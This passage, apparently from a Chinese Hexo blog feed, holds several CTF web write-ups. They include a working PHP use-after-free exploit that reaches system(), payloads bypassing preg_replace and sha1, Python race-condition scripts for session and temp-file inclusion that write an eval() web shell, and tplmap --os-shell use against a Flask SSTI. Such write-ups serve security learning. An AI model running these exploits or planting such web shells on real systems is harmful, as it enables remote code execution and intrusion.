0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"></span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write</span><br><span class="line">                # handle pie</span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec</span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # &#x27;constant&#x27; constant check</span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # &#x27;bin2hex&#x27; constant check</span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) &#123; # ELF header</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"></span><br><span class="line">            if($f_name == 0x6d6574737973) &#123; # system</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        &#125; while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class ryat &#123;</span><br><span class="line">        var $ryat;</span><br><span class="line">        var $chtg;</span><br><span class="line">        </span><br><span class="line">        function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;chtg = $this-&gt;ryat;</span><br><span class="line">            $this-&gt;ryat = 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class="line">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = 10; # increase this value if you get segfaults</span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(&#x27;A&#x27;, 79);</span><br><span class="line"></span><br><span class="line">    $poc = &#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[0] = ptr2str(0, 79);</span><br><span class="line">    unset($v);</span><br><span class="line">    $abc = $out[2][0];</span><br><span class="line"></span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # leaks</span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"></span><br><span class="line">    # fake value</span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"></span><br><span class="line">    # fake reference</span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # fake closure object</span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # pwn</span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); # internal func type</span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler</span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传这个文件到/var/tmp目录下，然后在搜索页面构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(&quot;/var/tmp/exp.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><p>然后访问runtime/session/sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php执行文件即可得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ThinkPHP6任意文件操作漏洞分析&quot;&gt;&lt;a href=&quot;#ThinkPHP6任意文件操作漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP6任意文件操作漏洞分析&quot;&gt;&lt;/a&gt;ThinkPHP6任意文件操作漏洞分析&lt;/h1&gt;&lt;h2 i</summary>
      
    
    
    
    
    <category term="框架" scheme="http://example.com/tags/%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>preg_replace绕过以及sha1()函数的绕过以及json编码</title>
    <link href="http://example.com/2021/10/08/preg_replace%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Asha1()%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Ajson%E7%BC%96%E7%A0%81/"/>
    <id>http://example.com/2021/10/08/preg_replace%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Asha1()%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Ajson%E7%BC%96%E7%A0%81/</id>
    <published>2021-10-07T16:00:00.000Z</published>
    <updated>2021-10-08T13:54:22.538Z</updated>
    
    <content type="html"><![CDATA[<h1 id="preg-replace绕过以及sha1-函数绕过以及json编码"><a href="#preg-replace绕过以及sha1-函数绕过以及json编码" class="headerlink" title="preg_replace绕过以及sha1()函数绕过以及json编码"></a>preg_replace绕过以及sha1()函数绕过以及json编码</h1><p>打开页面，有源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;./flag.php&quot;;</span><br><span class="line">include &quot;./result.php&quot;;</span><br><span class="line">if(isset($_GET[&#x27;aaa&#x27;])&amp;&amp;strlen($_GET[&#x27;aaa&#x27;]&lt;20))&#123;</span><br><span class="line">$aaa=preg_replace(&#x27;/^(.*)level(.*)$/&#x27;,&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;,$_GET[&#x27;aaa&#x27;]);</span><br><span class="line">if(preg_match(&#x27;/pass_the_level_1#/&#x27;,$aaa))&#123;</span><br><span class="line">echo &quot;here is level 2&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;admin&#x27;]) and isset($_POST[&#x27;root_pwd&#x27;]))&#123;</span><br><span class="line">if($_POST[&#x27;admin&#x27;]==$_POST[&#x27;root_pwd&#x27;])</span><br><span class="line">echo &quot;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">else if(sha1($_POST[&#x27;admin&#x27;])===sha1($_POST[&#x27;root_pwd&#x27;]))&#123;</span><br><span class="line">echo &quot;here is level 3,do you how to overcome it?&quot;;</span><br><span class="line">if(isset($_POST[&#x27;level_3&#x27;]))&#123;</span><br><span class="line">$level_3=json_decode($_POST[&#x27;level_3&#x27;]);</span><br><span class="line">if($level_3-&gt;result==$result)&#123;</span><br><span class="line">echo &quot;success:&quot;.$flag;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;you never beat me!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;out&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">die(&quot;no&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;nonono!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过对源码的审计，我们知道只要我们通过三个if，我们就可以读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/pass_the_level_1#/&#x27;,$aaa))</span><br><span class="line"></span><br><span class="line">else if(sha1($_POST[&#x27;admin&#x27;])===sha1($_POST[&#x27;root_pwd&#x27;]))</span><br><span class="line"></span><br><span class="line">if($level_3-&gt;result==$result)</span><br></pre></td></tr></table></figure><p>对于第一个if，我们可以看见</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$aaa=preg_replace(&#x27;/^(.*)level(.*)$/&#x27;,&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;,$_GET[&#x27;aaa&#x27;]);</span><br><span class="line">   if(preg_match(&#x27;/pass_the_level_1#/&#x27;,$aaa))&#123;</span><br><span class="line">       echo &quot;here is level 2&quot;; </span><br></pre></td></tr></table></figure><p>我们需要绕过preg_replace()函数，而由于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^$/</span><br></pre></td></tr></table></figure><p>是单行的检测替换，所以我们可以通过换行符来绕过，因此构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?aaa=%0apass_the_level_1%23</span><br></pre></td></tr></table></figure><p>既可通过第一个if，而对于第二个if，是sha1()的加密，它在低版本的php中有一个漏洞，就是当对数组进行加密时，由于sha1()无法处理数组类型，所以会报错且会返回false，从而绕过第二个if，因此构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?admin[]=&amp;root_pwd[]=123</span><br></pre></td></tr></table></figure><p>对于第三个if，它首先会进行json解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$level_3=json_decode($_POST[&#x27;level_3&#x27;]);</span><br></pre></td></tr></table></figure><p>而第三个if是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($level_3-&gt;result==$result)</span><br></pre></td></tr></table></figure><p>所以我们需要输入json编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>即可绕过第三个if，而原因好像是当我们这样构造时，输入进去的是int类型，而在比较时会转换为相同的数据类型，所以才会通过第三个if</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;preg-replace绕过以及sha1-函数绕过以及json编码&quot;&gt;&lt;a href=&quot;#preg-replace绕过以及sha1-函数绕过以及json编码&quot; class=&quot;headerlink&quot; title=&quot;preg_replace绕过以及sha1()函数绕过</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>重定向以及session文件包含以及php临时文件包含</title>
    <link href="http://example.com/2021/10/07/%E9%87%8D%E5%AE%9A%E5%90%91%E4%BB%A5%E5%8F%8Asession%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BB%A5%E5%8F%8Aphp%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://example.com/2021/10/07/%E9%87%8D%E5%AE%9A%E5%90%91%E4%BB%A5%E5%8F%8Asession%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BB%A5%E5%8F%8Aphp%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2021-10-06T16:00:00.000Z</published>
    <updated>2021-10-07T13:27:24.434Z</updated>
    
    <content type="html"><![CDATA[<h1 id="重定向以及session文件包含以及php临时文件包含"><a href="#重定向以及session文件包含以及php临时文件包含" class="headerlink" title="重定向以及session文件包含以及php临时文件包含"></a>重定向以及session文件包含以及php临时文件包含</h1><h2 id="实例-NPUCTF2020-ezinclude"><a href="#实例-NPUCTF2020-ezinclude" class="headerlink" title="实例([NPUCTF2020]ezinclude)"></a>实例([NPUCTF2020]ezinclude)</h2><p>打开页面源码，发现有一个提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br></pre></td></tr></table></figure><p>然后抓包并发送，回显的包中的set-cookie字段有一个hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: Hash=fa25e54758d5d5c1927781a6ede89f8a</span><br></pre></td></tr></table></figure><p>所以推测是pass的值，所以构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pass=fa25e54758d5d5c1927781a6ede89f8a</span><br></pre></td></tr></table></figure><p>发现出现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location.href=&quot;flflflflag.php&quot;;</span><br></pre></td></tr></table></figure><p>字段，当在浏览器构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php</span><br></pre></td></tr></table></figure><p>发现出现404页面，然后通过抓包后同样get提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php</span><br></pre></td></tr></table></figure><p>发现原来是重定向，但是通过bp抓包，可以绕过，所以抓包构造/flflflflag.php，发现是文件包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include($_GET[&quot;file&quot;])</span><br></pre></td></tr></table></figure><p>但是不知道flag.php在哪一个文件中，但是通过目录扫描，发现有一个dir.php文件，里面有临时文件的信息，而php7有一个特性，就是当利用过滤器strip_tags来从字符串中去除HTML和PHP标记时，可以让php执行时直接出现Segment Fault（段故障），这样php的垃圾回收机制就不会继续执行，导致post提交的文件会保存在临时文件夹中不会被清除，而访问dir.php可以知道此时post上传文件的名字</p><p>所以我们可以利用php伪协议来调用strip_tags过滤器，并与此同时post提交文件，致使php执行时出现Segment Fault，post提交的文件会保存在临时文件夹中<br>所以我们可以利用这个漏洞以及inculde()函数的包含来任意代码执行，因此exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line">url=&quot;http://b029c3b5-3789-4d78-9258-1ff98f05a610.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br><span class="line">payload=&quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">files=&#123;</span><br><span class="line">    &quot;file&quot;:BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url=url,files=files,allow_redirects=False)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>此时，只要访问dir.php，即可知道post提交的文件的文件名为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(9) &quot;phpfx0Sxt&quot; </span><br></pre></td></tr></table></figure><p>然后我们在构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php?file=/tmp/phpfx0Sxt</span><br></pre></td></tr></table></figure><p>对文件进行包含，即可执行代码，注意要抓包提交，在浏览器提交的话会重定向到404.html文件中，然后ctrl+F找flag字段即可，由于有include()函数，所以也可以尝试以下session文件包含</p><p>在session中上传的数据会保存在sess_{sessid}中，然后系统会对这个文件进行检测，有害则删除，无害则留下，所以我们可以利用检测的时间，对这个文件进行包含，从而执行代码，所以我们可以写exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">host = &#x27;http://b65810ac-4e60-430f-a394-3ee290d0158d.node4.buuoj.cn:81/flflflflag.php&#x27;</span><br><span class="line">sessid = &#x27;feng&#x27;</span><br><span class="line"></span><br><span class="line">def POST(session):</span><br><span class="line">    while True:</span><br><span class="line">        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php system(&#x27;ls /&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;&quot;&#125;,</span><br><span class="line">            files=&#123;&quot;file&quot;:(&#x27;a.txt&#x27;, f)&#125;,</span><br><span class="line">            cookies=&#123;&#x27;PHPSESSID&#x27;:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">def READ(session):</span><br><span class="line">    while True:</span><br><span class="line">        response = session.get(f&#x27;&#123;host&#125;?file=/tmp/sess_&#123;sessid&#125;&#x27;)</span><br><span class="line">        # print(response.text)</span><br><span class="line">        if &#x27;c4ca4238a0b923820dcc509a6f75849b&#x27; not in response.text:</span><br><span class="line">            print(&#x27;[+++]retry&#x27;)</span><br><span class="line">            print(response.text)</span><br><span class="line">        else:</span><br><span class="line">            print(response.text)</span><br><span class="line">            sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() as session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = True</span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中这串代码就是我们想要执行的恶意代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;ls /&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>而这串代码的意思是会在根目录下创建shell.php文件，且shell文件中内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[cmd])?&gt;</span><br></pre></td></tr></table></figure><p>所以我们直接构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/shell.php</span><br><span class="line"></span><br><span class="line">post提交：cmd=phpinfo();</span><br></pre></td></tr></table></figure><p>即可看到php版本信息，然后找flag字段就可以获得flag</p><p>参考文章：[<a href="https://www.icode9.com/content-4-1033782.html]">https://www.icode9.com/content-4-1033782.html]</a> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;重定向以及session文件包含以及php临时文件包含&quot;&gt;&lt;a href=&quot;#重定向以及session文件包含以及php临时文件包含&quot; class=&quot;headerlink&quot; title=&quot;重定向以及session文件包含以及php临时文件包含&quot;&gt;&lt;/a&gt;重定向以及</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>flask模板注入以及arjun和tplmap工具运用以及rc4加密</title>
    <link href="http://example.com/2021/10/06/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Aarjun%E5%92%8Ctalmap%E5%B7%A5%E5%85%B7%E8%BF%90%E7%94%A8%E4%BB%A5%E5%8F%8Arc4%E5%8A%A0%E5%AF%86/"/>
    <id>http://example.com/2021/10/06/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Aarjun%E5%92%8Ctalmap%E5%B7%A5%E5%85%B7%E8%BF%90%E7%94%A8%E4%BB%A5%E5%8F%8Arc4%E5%8A%A0%E5%AF%86/</id>
    <published>2021-10-05T16:00:00.000Z</published>
    <updated>2021-10-06T17:29:34.275Z</updated>
    
    <content type="html"><![CDATA[<h1 id="flask模板注入之arjun和tplmap工具的使用"><a href="#flask模板注入之arjun和tplmap工具的使用" class="headerlink" title="flask模板注入之arjun和tplmap工具的使用"></a>flask模板注入之arjun和tplmap工具的使用</h1><p>打开页面，发现页面有显示flask字段，再看题目名称，可以推测是flask注入，但是注入点在哪里呢，找不到，所以我们可以使用arjun工具爆出注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 arjun.py -u http://url/ --get -d 5 -t 1</span><br></pre></td></tr></table></figure><p>-d 5的作用是请求间隔，如果服务器设置了防ddos，则一定要加-d 5，否则会429，无法爆破出来，最后爆破，结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Analysing the content of the webpage</span><br><span class="line">Analysing behaviour for a non-existent parameter</span><br><span class="line">Reflections: 0</span><br><span class="line">Response Code: 200</span><br><span class="line">Content Length: 2292</span><br><span class="line">Plain-text Length: 428</span><br><span class="line">Parsing webpage for potential parameters</span><br><span class="line">Performing heuristic level checks</span><br><span class="line">Heuristic found 2 potential parameters.</span><br><span class="line">Scan Completed</span><br><span class="line">Valid parameter found: name</span><br><span class="line">Reason: Different number of reflections</span><br></pre></td></tr></table></figure><p>因此，我们可以知道注入点是name，所以我们构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p>发现回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I ♥ Flask &amp; 49 </span><br></pre></td></tr></table></figure><p>因此，注入点找到，我们可以使用内置类subprocess.Popen类来执行命令，但是这里有个tplmap的工具，可以让我们知道是什么类型的模板注入以及获得shell</p><p>我们可以输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 tplmap.py -u http://url/?name=1</span><br></pre></td></tr></table></figure><p>即可看到是jinja模板的注入，然后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 tplmap.py -u http://url/?name=1 --os-shell</span><br></pre></td></tr></table></figure><p>即可获得shell，然后直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure><p>即可获得flag</p><h1 